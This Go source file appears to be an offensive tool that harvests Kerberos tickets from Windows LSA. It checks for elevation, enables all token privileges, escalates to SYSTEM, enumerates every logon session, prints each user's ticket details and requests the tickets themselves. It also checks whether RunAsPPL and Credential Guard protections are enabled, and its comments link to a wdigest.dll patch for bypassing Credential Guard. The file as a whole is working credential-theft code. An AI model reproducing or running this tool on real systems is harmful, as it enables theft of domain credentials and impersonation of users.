package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"github.com/redt1de/gubeus/lsa"
	"github.com/fourcorelabs/wintoken"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var DEBUG bool

func main() {
	DEBUG = true

	// CheckProtect()
	// return

	if len(os.Args) > 1 {
		time.Sleep(time.Second * 20)
	}
	lsa.DebugLSA = false
	// check privs
	curToken, err := wintoken.OpenProcessToken(int(windows.GetCurrentProcessId()), wintoken.TokenPrimary)
	if err != nil {
		panic(err)
	}
	defer curToken.Close()
	if !curToken.Token().IsElevated() {
		log.Fatal("[ERROR] Not running in an elevated context")
	}
	curToken.EnableAllPrivileges()
	privs, _ := curToken.GetPrivileges()
	for _, p := range privs {
		if p.Name == "SeImpersonatePrivilege" {
			fmt.Println("[+] We have SeImpersonatePrivilege")
		}
	}

	// attempt to escalate to system
	GetSystem()

	// get handle to lsa
	lsaHandle, err := lsa.GetLsaHAndle()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] LSA Handle:", &lsaHandle)
	// get the auth package
	authPack, err := lsa.LookupAuthPackage(lsaHandle)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Auth Package:", authPack)

	// enumerate logon sessions
	luids, err := lsa.GetLogonSessions()
	if err != nil {
		fmt.Println("[ERROR] GetLogonSessions:", err)
		os.Exit(1)
	}
	fmt.Println()
	for _, luid := range luids {
		// get info about the session
		sd, err := lsa.GetLogonSessionData(&luid)
		if err != nil {
			fmt.Println("[ERROR] LsaGetLogonSessionData:", err)
			os.Exit(1)
		}

		// get info about the ticket
		ticketInfos := lsa.GetTicketInfoExS(lsaHandle, authPack, luid, sd)

		if len(ticketInfos) > 0 {
			fmt.Println("##################################################")
			fmt.Println("Username:", sd.UserName)
			fmt.Println("SID:", sd.Sid)
			fmt.Println("Ticket Count:", len(ticketInfos))
			for _, tic := range ticketInfos {
				fmt.Println("------------------------------------------")
				fmt.Println("Client Name:", tic.ClientName)
				fmt.Println("Client Realm:", tic.ClientRealm)
				fmt.Println("Server Name:", tic.ServerName)
				fmt.Println("Server Realm:", tic.ServerRealm)
				fmt.Println("Start Time:", lsa.TimeFromUint64(uint64(tic.StartTime)))
				fmt.Println("End Time:", lsa.TimeFromUint64(uint64(tic.EndTime)))
				fmt.Println("Renew Time:", lsa.TimeFromUint64(uint64(tic.RenewTime)))

				// request the actual ticket
				lsa.GetTicket(lsaHandle, authPack, luid, sd, tic.ServerName)
			}
		}

	}
}

// RunAsPPL
// HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa.
// Set the value of the registry key to:
// "RunAsPPL"=dword:00000001 to configure the feature with a UEFI variable.
// "RunAsPPL"=dword:00000002 to configure the feature without a UEFI variable (only on Windows 11, 22H2).

// poc to patch wdigest.dll to bypass
// https://teamhydra.blog/2020/08/25/bypassing-credential-guard/
// https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240

func CheckProtect() bool {
	// check for RunAsPPL
	regInfo, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Lsa`, registry.QUERY_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	a, _, _ := regInfo.GetIntegerValue("RunAsPPL")
	if a != 0 {
		log.Fatal("[ERROR] RunAsPPL is enabled, this is not going to work!")
	}

	regInfo, err = registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Lsa`, registry.QUERY_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	a, _, _ = regInfo.GetIntegerValue("LsaCfgFlags")
	if a != 0 {
		log.Fatal("[ERROR] Credential Guard is enabled, this is not going to work!")
	}

	return false
}
